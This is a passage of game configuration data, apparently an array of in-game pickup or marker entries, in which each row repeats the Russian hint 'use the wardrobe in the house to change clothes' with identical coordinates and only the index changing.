	{1, 113, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 114, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 115, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 116, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 117, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 118, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 119, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 120, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 121, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 122, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 123, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 124, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 125, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 126, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 127, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 128, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 129, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 130, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 131, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 132, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 133, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 134, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 135, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 136, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 137, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 138, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 139, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 140, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 141, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 142, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 143, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 144, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 145, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 146, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 147, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 148, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 149, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 150, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 151, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 152, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 153, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 154, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 155, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 156, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 157, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 158, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 159, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 160, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 161, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 162, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 163, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 164, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 165, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 166, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 167, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 168, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 169, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 170, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 171, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 172, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 173, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 174, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 175, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 176, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 177, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 178, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 179, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 180, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 181, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 182, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 183, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 184, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 185, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 186, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 187, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 188, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 189, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 190, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 191, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 192, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 193, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 194, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 195, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 196, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 197, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 198, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 199, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 200, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 201, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 202, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 203, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 204, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 205, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 206, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 207, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 208, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 209, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 210, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 211, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 212, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 213, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 214, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 215, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 216, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 217, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 218, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 219, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 220, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 221, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 222, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 223, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 224, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 225, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 226, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 227, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 228, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 229, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 230, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 231, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 232, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 233, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 234, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 235, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 236, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 237, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 238, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 239, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 240, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 241, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 242, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 243, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 244, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 245, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 246, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 247, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 248, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 249, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 250, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 251, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 252, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 253, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 254, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 255, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 256, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 257, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 258, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 259, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 260, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 261, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 262, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 263, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 264, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 265, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 266, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 267, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 268, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 269, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
